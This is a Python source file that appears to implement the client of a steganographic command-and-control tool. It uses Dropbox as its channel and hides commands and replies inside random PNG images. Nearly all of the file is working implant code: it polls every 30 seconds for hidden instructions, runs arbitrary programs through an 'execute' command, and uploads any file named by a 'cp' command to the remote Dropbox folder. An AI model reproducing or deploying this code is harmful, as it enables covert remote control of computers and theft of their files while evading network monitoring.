import dropbox
import sys
from stegano import lsb
from randimage import get_random_image
from datetime import datetime
import matplotlib
import random
import os
import io
import time
import string
import subprocess

#time between checks for requests from server
CHECK_PERIOD = 30

tmp_path = None


def current_datetime():
    return datetime.now().strftime("%d/%m/%Y %H:%M:%S")


def init(access_token):
    access_token = sys.argv[1]
    dbx = dropbox.Dropbox(access_token)

    if len(dbx.files_list_folder('').entries) == 0:
        dbx.files_create_folder('/art')

    return dbx


def register(dbx):
    #generate random image
    print("Generating image (does take a couple of seconds)...")
    img_size = (512,512)
    img = get_random_image(img_size)

    buf = io.BytesIO()

    matplotlib.image.imsave(buf, img)

    #initial command
    message = current_datetime() + "|RESPONSE|register|;"
    secret = lsb.hide(buf, message,  lsb.generators.eratosthenes())

    buf = io.BytesIO()
    secret.save(buf, format='PNG')

    f=open(tmp_path + 'words.txt')
    lines=f.readlines()
    f.close()

    #read used names by other clients
    names = []
    for entry in dbx.files_list_folder('/art').entries:
        names.append(entry.name[:-4])
  
    #generate random new name
    idx = random.randint(0, len(lines))
    new_name = lines[idx].strip()
    while new_name in names:
        idx = random.randint(0, len(lines))
        new_name = lines[idx].strip()

    new_name = new_name+'.png'
    print("ID: " + new_name)

    #upload image with name to dropbox
    dbx.files_upload(buf.getvalue(), '/art/' + new_name)

    return new_name


def call_command(args):
    #execute command in shell 
    proc = subprocess.run(args, capture_output=True, text=True)
    if proc.returncode == 0:
        ret = proc.stdout
    else:
        ret = proc.stderr
    return ret

def execute_command(dbx, fields):
    #execute command based on incomming requests
    words = fields[2].split(' ')
    print("Processing " + fields[0] + " " + fields[2])

    if words[0] == 'who':
        content = call_command(["w"])
    elif words[0] == 'ls':
        content = call_command(["ls", words[1]])
    elif words[0] == 'id':
        content = call_command(["id"])
    elif words[0] == 'cp':
        path = words[1]
        if not os.path.isfile(path):
            content = 'cp error - no such file'
        else:
            ext = os.path.splitext('/home/david/graphs/lm_gen_edges.png')[-1]
            rand_name = 'TMP_' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=32)) + ext
            f = open(path, "rb")
            dbx.files_upload(io.BytesIO(f.read()).getvalue(), '/art/' + rand_name)
            f.close()
            content = rand_name + '\n'
    elif words[0] == 'execute':
        content = call_command([words[1]])
    elif words[0] == 'heartbeat':
        content = 'Alive\n'
    else: 
        content = 'Invalid command'

    return content

def listen(dbx, my_id):
    #main client loop
    print("Listening...")
    last_check = datetime.now()
    while True:
        #wait CHECK_PERIOD seconds for requests
        diff = datetime.now() - last_check
        if diff.seconds <= CHECK_PERIOD:
            time.sleep(CHECK_PERIOD - diff.seconds)

        #check for incoming requests
        tmp = datetime.now()    
        process_commands(dbx, my_id, last_check)
        last_check = tmp

def process_commands(dbx, my_id, last_check):
    #get this process's secret message from its file
    for entry in dbx.files_list_folder('/art').entries:
        if entry.name == my_id:
            dbx.files_download_to_file(tmp_path + entry.name, entry.path_lower)

    message = lsb.reveal(tmp_path + my_id, lsb.generators.eratosthenes())

    #for each request create a template response and insert command output into it
    for line in message.split(';')[:-1]:
        fields = line.split('|')
        command_time = datetime.strptime(fields[0], "%d/%m/%Y %H:%M:%S")
        if last_check < command_time and fields[1] == 'REQUEST':
            content = 'Response to ' + fields[0] + ' ' + fields[2] + ' from ' + my_id + '\n'
            content += execute_command(dbx, fields)
            response = fields.copy()
            response[0] = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
            response[1] = 'RESPONSE'
            response[3] = content
            message += '|'.join(response)
            message += ';'

    #hide responses into the image
    secret = lsb.hide(tmp_path + my_id, message,  lsb.generators.eratosthenes())

    #upload image
    buf = io.BytesIO()
    secret.save(buf, format='PNG')
    dbx.files_upload(buf.getvalue(), '/art/' + my_id, mode=dropbox.files.WriteMode.overwrite)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Error - Invalid Call")
        print("Usage: python3", sys.argv[0], "APP_ACCESS_TOKEN TMP_DIR_PATH")
    else:
        #create tmp dir if it doesn't exist
        tmp_path = sys.argv[2]
        if not os.path.exists(tmp_path):
            os.makedirs(tmp_path)

        #get dropbox object
        dbx = init(sys.argv[1])
        #get words list from dropbox
        dbx.files_download_to_file(tmp_path + 'words.txt', '/words.txt')
        #create an image (i.e. communication channel)
        my_id = register(dbx)
        #listen for requests
        listen(dbx, my_id)
        
